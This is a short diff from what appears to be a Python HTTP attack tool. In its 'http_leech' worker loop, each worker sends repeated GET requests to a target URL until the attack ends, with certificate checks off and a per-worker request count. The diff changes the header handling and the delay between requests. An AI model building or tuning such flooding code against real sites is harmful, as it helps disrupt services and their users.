@@ -167,8 +167,8 @@ def http_leech(worker_id, session, target_url, attack_duration, useragent=None, 
     while time.time() < stoptime and Core.attackrunning:
         try:
 
-            session.get(target_url, headers=buildheaders(target_url, useragent, referer), verify=False, timeout=2, allow_redirects=False, stream=False)
-            time.sleep(uniform(60, 100))
+            session.get(target_url, headers=headers, verify=False, timeout=2, allow_redirects=False, stream=False)
+            time.sleep(uniform(80, 160))
 
             Core.infodict[worker_id]['req_sent'] += 1
         except Exception:
